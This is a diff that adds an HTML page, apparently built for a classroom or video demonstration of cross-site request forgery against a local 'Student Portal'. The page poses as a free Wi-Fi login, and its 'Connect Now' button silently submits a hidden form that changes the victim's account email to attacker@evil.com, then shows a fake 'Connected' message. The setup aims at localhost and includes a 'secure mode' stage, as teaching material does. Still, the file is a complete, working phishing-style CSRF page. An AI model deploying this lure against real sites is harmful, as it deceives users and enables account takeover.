@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Free Public Wi-Fi</title>
+  <link rel="stylesheet" href="/styles.css">
+</head>
+<body>
+  <div class="wifi-card">
+    <!-- Wi-Fi illustration in the center -->
+    <div class="wifi-icon">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+        <path d="M5 12.55a11 11 0 0 1 14.08 0"></path>
+        <path d="M1.42 9a16 16 0 0 1 21.16 0"></path>
+        <path d="M8.53 16.11a6 6 0 0 1 6.95 0"></path>
+        <line x1="12" y1="20" x2="12.01" y2="20"></line>
+      </svg>
+    </div>
+
+    <!-- Heading -->
+    <h1>Free Public Wi-Fi</h1>
+
+    <!-- Welcome Message -->
+    <p>Welcome! Connect to our free public Wi-Fi and enjoy unlimited browsing.</p>
+
+    <!-- Hidden iframe to process cross-origin GET request silently without redirecting -->
+    <iframe name="csrf_frame" id="csrf_frame" style="display:none;"></iframe>
+
+    <!-- ========================================================================= -->
+    <!-- Video Demonstration Stage Configuration (Manual):                         -->
+    <!-- Stage 1 (Vulnerable Mode): action="http://localhost:3000/api/vulnerable/change-email" -->
+    <!-- Stage 2 (Secure Mode):     action="http://localhost:3000/api/secure/change-email"     -->
+    <!-- ========================================================================= -->
+    <form id="wifi-form" action="http://localhost:3000/api/vulnerable/change-email" method="GET" target="csrf_frame" style="display:none;">
+      <input type="hidden" name="email" value="attacker@evil.com">
+    </form>
+
+    <!-- Prominent Connect Now Button -->
+    <button type="button" id="btn-connect" class="btn-connect">
+      Connect Now
+    </button>
+
+    <!-- Connection Status Feedback -->
+    <div id="status-box" class="status-message" style="display:none;">
+      Connecting to network... You are now connected to Free Public Wi-Fi.
+    </div>
+
+    <!-- Link back to Student Portal for verification -->
+    <div class="footer-link">
+      <a href="http://localhost:3000/dashboard" target="_blank">&larr; Back to Student Portal</a>
+    </div>
+  </div>
+
+  <script>
+    const wifiForm = document.getElementById("wifi-form");
+    const statusBox = document.getElementById("status-box");
+    const btnConnect = document.getElementById("btn-connect");
+
+    // Support testing secure POST exploit via ?stage=2 in URL while keeping default as GET vulnerable exploit
+    const urlParams = new URLSearchParams(window.location.search);
+    if (urlParams.get("stage") === "2" || urlParams.get("method") === "post") {
+      wifiForm.action = "http://localhost:3000/api/secure/change-email";
+      wifiForm.method = "POST";
+    }
+
+    btnConnect.addEventListener("click", () => {
+      // Deceptive action: user thinks they are connecting to Wi-Fi,
+      // but browser silently sends GET request to Student Portal with session cookie
+      wifiForm.submit();
+
+      btnConnect.disabled = true;
+      btnConnect.textContent = "Connecting...";
+
+      setTimeout(() => {
+        btnConnect.textContent = "Connected";
+        statusBox.style.display = "block";
+      }, 500);
+    });
+  </script>
+</body>
+</html>
